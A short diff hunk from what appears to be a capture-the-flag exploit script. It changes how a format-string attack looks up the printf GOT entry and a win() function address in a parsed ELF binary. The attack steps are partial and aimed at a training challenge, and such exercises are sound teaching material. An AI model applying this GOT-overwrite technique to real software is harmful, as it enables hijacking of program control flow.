@@ -25,8 +25,8 @@ print("    [!] Format string offset found: " + str(offset))
 # Step 2: Identify target addresses
 print("\n[*] Step 2: Analyzing binary...")
 let elf = parse_elf(binary)
-let got_entry = elf["got"]["printf"]  # Target: GOT entry for printf
-let win_function = elf["symbols"]["win"]  # Goal: call win()
+let got_entry = elf.got.printf  # Target: GOT entry for printf
+let win_function = elf.symbols.win  # Goal: call win()
 
 print("    printf@GOT: " + hex(got_entry))
 print("    win() @ " + hex(win_function))
